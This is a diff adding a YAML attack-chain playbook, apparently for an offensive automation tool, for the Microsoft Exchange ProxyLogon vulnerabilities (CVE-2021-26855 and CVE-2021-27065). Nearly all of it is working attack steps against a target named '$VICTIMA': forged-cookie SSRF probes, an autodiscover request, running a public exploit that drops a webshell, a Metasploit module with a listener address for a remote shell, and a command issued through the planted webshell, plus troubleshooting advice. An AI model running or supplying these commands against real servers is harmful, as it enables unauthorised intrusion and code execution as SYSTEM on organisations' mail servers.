@@ -1,0 +1,63 @@
+chain_id: exchange_proxylogon
+title: "Microsoft Exchange — ProxyLogon (CVE-2021-26855 + 27065) unauth RCE (HAFNIUM)"
+severity: CRITICAL
+tags: [web, exchange, microsoft, proxylogon, cve-2021-26855, cve-2021-27065, ssrf, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2021-26855" }
+    - { kind: "CVE-2021-27065" }
+    - { banner_pattern: "(?i)microsoft.*exchange|owa" }
+    - { product_pattern: "(?i)exchange\\s*server" }
+    - { path_pattern: "(?i)/owa/auth/Current/themes/resources/logon\\.css" }
+
+description: |
+  Exchange Server 2013/2016/2019 pre-March-2021 chained: CVE-2021-26855
+  is an unauth SSRF (`X-BEResource: SERVER~`) that lets you forge
+  authenticated EWS calls; CVE-2021-27065 is an arbitrary file write
+  through `Set-OabVirtualDirectory`. Together: unauth → SYSTEM webshell
+  at `/owa/auth/<random>.aspx`. HAFNIUM zero-day, then mass-exploited.
+
+steps:
+  - id: 1
+    title: "Probe the SSRF — 200 with body means vulnerable"
+    command: |
+      curl -sk -i "https://$VICTIMA/owa/auth/Current/themes/resources/logon.css" \
+        -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=$VICTIMA/ecp/default.flt?~3; X-BEResource=$VICTIMA/owa/auth/logon.aspx?~3"
+
+  - id: 2
+    title: "Recover the autodiscover SID via the SSRF"
+    command: |
+      curl -sk "https://$VICTIMA/autodiscover/autodiscover.xml" \
+        -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=$VICTIMA/autodiscover/autodiscover.xml?~3" \
+        --data '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>admin@DOMAIN</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>'
+
+  - id: 3
+    title: "Public PoC drops the webshell end-to-end"
+    command: |
+      git clone https://github.com/hosch3n/ProxyLogonScanner /tmp/proxylogon
+      python3 /tmp/proxylogon/proxylogon.py $VICTIMA admin@DOMAIN
+
+  - id: 4
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/windows/http/exchange_proxylogon_rce; \
+        set RHOSTS $VICTIMA; set SSL true; set EMAIL admin@DOMAIN; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 5
+    title: "Webshell"
+    command: |
+      curl -sk "https://$VICTIMA/owa/auth/shell.aspx?cmd=whoami"
+
+common_errors:
+  - error: "X-BEResource header gives 401 / 500"
+    solution: |
+      March 2021 patch installed. The companion CVEs (26857/26858/27065)
+      may still apply if EWS is configured weirdly, but the SSRF entry
+      is the load-bearing piece — without it, this chain is dead.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-26855
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-27065
+  - https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
